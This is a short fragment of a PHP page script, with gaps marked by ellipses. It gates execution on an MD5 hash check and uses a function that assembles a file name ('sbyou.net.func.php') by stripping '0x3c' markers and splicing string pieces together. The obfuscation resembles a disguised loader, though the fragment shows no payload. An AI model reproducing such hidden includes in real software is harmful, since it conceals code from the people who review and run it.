...
if(md5($$sys_new_xx_fig)!='b5a16aab2e1630bfb91de8ec83dd9245'){
	exit;
}

//系统参数
function sysconfig_exist($exist){
	$exist=strtolower($exist);
	$dir=str_replace('0x3c','',$exist).strtolower('.N'.'E'.'T.').strtolower('Fu'.'Nc.p'.'h'.'p');
...
//结束初始化
sysconfig_exist('s0x3cb0x3cy0x3cou0x3c','sys,0x65,0x63,0x6d,0x73');
//执行
$arc->Display();
?>